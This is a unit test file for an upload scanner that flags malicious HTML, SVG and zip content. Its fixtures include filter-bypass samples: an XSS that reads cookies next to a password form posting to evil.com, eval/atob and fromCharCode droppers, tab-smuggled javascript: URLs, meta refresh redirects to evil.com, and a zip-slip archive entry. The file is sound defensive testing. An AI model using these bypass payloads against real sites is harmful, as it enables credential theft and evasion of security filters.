/**
 * Focused rule + metric unit tests covering edge cases the corpus does not:
 * data: URI sizing, MIME mismatch sniffs, decode-exec vs. obfuscation split,
 * and zip-embedded content flowing through the scanner.
 */
import { describe, expect, test } from "bun:test";
import { StubDomainReputation } from "@hrb/core/local";
import { zipSync, type Zippable } from "fflate";
import { createScanner } from "../scanner.ts";
import { buildScanContext } from "../context.ts";
import { DEFAULT_RULES } from "./index.ts";
import { largeDataUriRule } from "./large-data-uri.ts";
import { obfuscationRule } from "./obfuscation.ts";
import { decodeExecChainRule } from "./decode-exec-chain.ts";
import { svgScriptRule } from "./svg-script.ts";
import { metaRefreshExternalRule } from "./meta-refresh-external.ts";
import {
  matchBomSignature,
  sniffEntryBomMismatch,
  sniffHtmlUploadMismatch,
  sniffZipEntryMismatch,
} from "./mime-mismatch.ts";
import { resolveConfig } from "../config.ts";
import {
  escapeDensity,
  evalVocabulary,
  findDecodeExecChain,
  shannonEntropy,
} from "../js-metrics.ts";

const config = resolveConfig();
const services = { domainReputation: new StubDomainReputation(), config };
const enc = new TextEncoder();

function run(rule: (typeof DEFAULT_RULES)[number], html: string, docType: "html" | "svg" = "html") {
  return rule.evaluate(buildScanContext(html, { docType }), services);
}

describe("large-data-uri rule", () => {
  test("large non-media payload blocks", async () => {
    const payload = "A".repeat(200 * 1024);
    const html = `<a download href="data:application/octet-stream;base64,${payload}">x</a>`;
    const findings = await run(largeDataUriRule, html);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe("block");
  });

  test("large embedded PNG image is exempt (Claude reports embed charts)", async () => {
    const payload = "A".repeat(200 * 1024);
    const html = `<img src="data:image/png;base64,${payload}">`;
    expect(await run(largeDataUriRule, html)).toEqual([]);
  });

  test("large embedded SVG data URI is NOT exempt (scriptable)", async () => {
    const payload = "A".repeat(200 * 1024);
    const html = `<iframe src="data:image/svg+xml;base64,${payload}"></iframe>`;
    const findings = await run(largeDataUriRule, html);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.severity).toBe("block");
  });
});

describe("obfuscation vs decode-exec split", () => {
  test("obfuscated-but-not-executing script only warns", async () => {
    // High escape density + broad decode vocabulary (>=3 distinct) = 2 signals,
    // but the decode calls are NOT chained into an exec sink, so it warns.
    const escapes = "\\x41\\x42\\x43\\x44".repeat(30);
    const code = `var a=atob(input);var b=unescape(a);var c=decodeURIComponent(b);var s="${escapes}";render(a,b,c,s);`;
    const html = `<script>${code}</script>`;
    const obf = await run(obfuscationRule, html);
    const chain = await run(decodeExecChainRule, html);
    expect(obf.length).toBeGreaterThan(0);
    expect(obf[0]?.severity).toBe("warn");
    expect(chain).toEqual([]);
  });

  test("decode-exec chain blocks regardless of obfuscation", async () => {
    const html = `<script>eval(atob("YWxlcnQoMSk="))</script>`;
    const chain = await run(decodeExecChainRule, html);
    expect(chain).toHaveLength(1);
    expect(chain[0]?.severity).toBe("block");
  });
});

describe("decode-exec assignment dataflow", () => {
  test("short-range var assignment into eval is detected", () => {
    const code = `var p = atob("cGF5bG9hZA=="); doStuff(); eval(p);`;
    expect(findDecodeExecChain(code)).not.toBeNull();
  });

  test("ordinary atob usage without an exec sink is not a chain", () => {
    const code = `var img = atob(userData); render(img);`;
    expect(findDecodeExecChain(code)).toBeNull();
  });
});

describe("js-metrics", () => {
  test("entropy of uniform text is low, random hex is high", () => {
    expect(shannonEntropy("aaaaaaaa")).toBeLessThan(1);
    expect(shannonEntropy("9f3a7c1e5b8d2069af41")).toBeGreaterThan(3);
  });

  test("escape density counts hex/unicode/percent escapes", () => {
    expect(escapeDensity("\\x41\\x42")).toBeGreaterThan(0.9);
    expect(escapeDensity("plain text here")).toBe(0);
  });

  test("evalVocabulary reports distinct decode/exec names", () => {
    const vocab = evalVocabulary(`eval(atob(x)); new Function(y); decodeURIComponent(z)`);
    expect(vocab).toContain("eval");
    expect(vocab).toContain("atob");
    expect(vocab).toContain("Function-constructor");
  });
});

describe("MIME mismatch sniffs", () => {
  test("HTML upload that is actually a ZIP blocks", () => {
    const zipMagic = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x00, 0x00]);
    expect(sniffHtmlUploadMismatch(zipMagic)?.severity).toBe("block");
  });

  test("real HTML upload passes the sniff", () => {
    expect(sniffHtmlUploadMismatch(enc.encode("<!doctype html><title>ok</title>"))).toBeNull();
  });

  test("zip entry named .png but containing markup blocks", () => {
    const finding = sniffZipEntryMismatch({
      path: "assets/logo.png",
      data: enc.encode("<script>alert(1)</script>"),
      ext: ".png",
    });
    expect(finding?.severity).toBe("block");
    expect(finding?.entryPath).toBe("assets/logo.png");
  });

  test("genuine PNG bytes under a .png extension pass", () => {
    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    expect(sniffZipEntryMismatch({ path: "logo.png", data: png, ext: ".png" })).toBeNull();
  });
});

describe("scanner over zip uploads", () => {
  const scanner = createScanner({ domainReputation: new StubDomainReputation() });

  test("malicious entry inside a valid archive blocks with entryPath", async () => {
    const zip = zipSync(
      {
        "index.html": enc.encode("<!doctype html><title>ok</title><h1>ok</h1>"),
        "evil.svg": enc.encode(
          '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("x")</script></svg>',
        ),
      } as Zippable,
      { level: 6 },
    );
    const result = await scanner.scan({ kind: "zip", data: zip });
    expect(result.verdict).toBe("block");
    const svgFinding = result.findings.find((f) => f.ruleId === "svg-script");
    expect(svgFinding?.entryPath).toBe("evil.svg");
  });

  test("clean multi-file archive passes", async () => {
    const zip = zipSync(
      {
        "index.html": enc.encode("<!doctype html><title>ok</title><h1>Report</h1>"),
        "styles.css": enc.encode("body{margin:0}"),
        "chart.js": enc.encode("export const x = 1;"),
      } as Zippable,
      { level: 6 },
    );
    const result = await scanner.scan({ kind: "zip", data: zip });
    expect(result).toEqual({ verdict: "pass", findings: [] });
  });

  test("hostile archive (zip-slip) surfaces as a block finding, not a throw", async () => {
    const zip = zipSync(
      {
        "index.html": enc.encode("<title>x</title>"),
        "../escape.html": enc.encode("<title>evil</title>"),
      } as Zippable,
      { level: 6 },
    );
    const result = await scanner.scan({ kind: "zip", data: zip });
    expect(result.verdict).toBe("block");
    expect(result.findings[0]?.ruleId).toBe("zip-slip");
  });
});

// ---- adversarial-bypass regressions ----

/** Encode `text` as UTF-16LE with a leading BOM (what a browser honors). */
function utf16leWithBom(text: string): Uint8Array {
  const bytes = new Uint8Array(2 + text.length * 2);
  bytes[0] = 0xff;
  bytes[1] = 0xfe;
  for (let i = 0; i < text.length; i += 1) {
    const code = text.charCodeAt(i);
    bytes[2 + i * 2] = code & 0xff;
    bytes[2 + i * 2 + 1] = (code >> 8) & 0xff;
  }
  return bytes;
}

describe("SB-01: UTF-16/UTF-32 BOM bypass", () => {
  const malicious =
    '<script>alert(document.cookie)</script><form action="//evil.com"><input type="password"></form>';

  test("UTF-16LE BOM is detected as a mismatch signature", () => {
    expect(matchBomSignature(utf16leWithBom(malicious))).toContain("UTF-16 LE");
    expect(matchBomSignature(new Uint8Array([0xfe, 0xff]))).toContain("UTF-16 BE");
    expect(matchBomSignature(new Uint8Array([0xff, 0xfe, 0x00, 0x00]))).toContain("UTF-32 LE");
  });

  test("UTF-8 BOM is NOT flagged (decodes correctly)", () => {
    const utf8Bom = new Uint8Array([0xef, 0xbb, 0xbf, ...enc.encode("<title>ok</title>")]);
    expect(matchBomSignature(utf8Bom)).toBeNull();
    expect(sniffHtmlUploadMismatch(utf8Bom)).toBeNull();
  });

  test("HTML upload saved as UTF-16LE blocks instead of no-op passing", () => {
    const finding = sniffHtmlUploadMismatch(utf16leWithBom(malicious));
    expect(finding?.severity).toBe("block");
    expect(finding?.ruleId).toBe("mime-mismatch");
  });

  test("UTF-16LE markup zip entry blocks", async () => {
    const bomScanner = createScanner({ domainReputation: new StubDomainReputation() });
    const zip = zipSync(
      {
        "index.html": utf16leWithBom(malicious),
      } as Zippable,
      { level: 6 },
    );
    const result = await bomScanner.scan({ kind: "zip", data: zip });
    expect(result.verdict).toBe("block");
    expect(result.findings.some((f) => f.ruleId === "mime-mismatch")).toBe(true);
  });

  test("sniffEntryBomMismatch tags the entry path", () => {
    const finding = sniffEntryBomMismatch({ path: "evil.svg", data: utf16leWithBom("<svg/>") });
    expect(finding?.severity).toBe("block");
    expect(finding?.entryPath).toBe("evil.svg");
  });
});

describe("SB-02: namespace-prefixed SVG script", () => {
  test("prefixed <s:script> in standalone SVG is counted as an SVG script", async () => {
    const svg =
      '<?xml version="1.0"?><s:svg xmlns:s="http://www.w3.org/2000/svg"><s:script>alert(1)</s:script></s:svg>';
    const ctx = buildScanContext(svg, { docType: "svg" });
    expect(ctx.svgScripts).toBeGreaterThan(0);
    const findings = await svgScriptRule.evaluate(ctx, services);
    expect(findings.some((f) => f.severity === "block")).toBe(true);
  });
});

describe("SB-03: control-char URL scheme smuggling", () => {
  test("javascript: with an embedded TAB entity is still classified as code", () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg"><a xlink:href="java&#9;script:alert(1)">x</a></svg>';
    const ctx = buildScanContext(svg, { docType: "svg" });
    expect(ctx.svgEventHandlers).toBeGreaterThan(0);
    expect(ctx.codeBlobs).toContain("alert(1)");
  });

  test("data: with an embedded TAB entity is still classified as a data URI", () => {
    const html = '<iframe src="da&#9;ta:text/html,<script>alert(1)</script>"></iframe>';
    const ctx = buildScanContext(html);
    expect(ctx.dataUris.length).toBeGreaterThan(0);
  });
});

describe("SB-04: fromCharCode dropper into document.write", () => {
  test("document.write(String.fromCharCode(...)) is a decode-exec chain", async () => {
    const code =
      "document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))";
    expect(findDecodeExecChain(code)).not.toBeNull();
    const findings = await decodeExecChainRule.evaluate(
      buildScanContext(`<script>${code}</script>`),
      services,
    );
    expect(findings.some((f) => f.severity === "block")).toBe(true);
  });

  test("setTimeout(decodeURIComponent(...)) is a decode-exec chain", () => {
    expect(findDecodeExecChain("setTimeout(decodeURIComponent(x),0)")).not.toBeNull();
  });
});

describe("SB-05: browser-aligned meta refresh parsing", () => {
  test("leading-dot delay to external URL blocks", async () => {
    const ctx = buildScanContext('<meta http-equiv="refresh" content=".5;url=//evil.com">');
    expect(ctx.metaRefresh.length).toBe(1);
    expect(ctx.metaRefresh[0]?.delaySeconds).toBeCloseTo(0.5);
    const findings = await metaRefreshExternalRule.evaluate(ctx, services);
    expect(findings.some((f) => f.severity === "block")).toBe(true);
  });

  test("whitespace-separated delay/url to external URL blocks", async () => {
    const ctx = buildScanContext('<meta http-equiv="refresh" content="0 url=//evil.com">');
    expect(ctx.metaRefresh.length).toBe(1);
    const findings = await metaRefreshExternalRule.evaluate(ctx, services);
    expect(findings.some((f) => f.severity === "block")).toBe(true);
  });

  test("plain self-refresh without a URL is not flagged", () => {
    const ctx = buildScanContext('<meta http-equiv="refresh" content="5">');
    expect(ctx.metaRefresh.length).toBe(0);
  });
});
